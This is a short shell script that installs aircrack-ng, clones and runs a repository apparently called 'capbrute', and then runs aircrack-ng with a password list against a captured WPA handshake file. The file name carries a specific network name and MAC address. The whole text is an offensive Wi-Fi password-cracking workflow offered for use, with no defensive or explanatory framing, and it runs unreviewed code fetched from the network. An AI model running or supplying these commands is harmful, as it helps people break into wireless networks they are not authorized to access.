sudo apt update -y
sudo apt install python3 aircrack-ng wget -y
git clone https://github.com/JamalNiga/capbrute
cd capbrute
python3 hy.py
sudo aircrack-ng -w pass.txt handshake_ALHN9933_EC-84-B4-CF-80-7D_2023-09-25T09-37-19.cap
#-
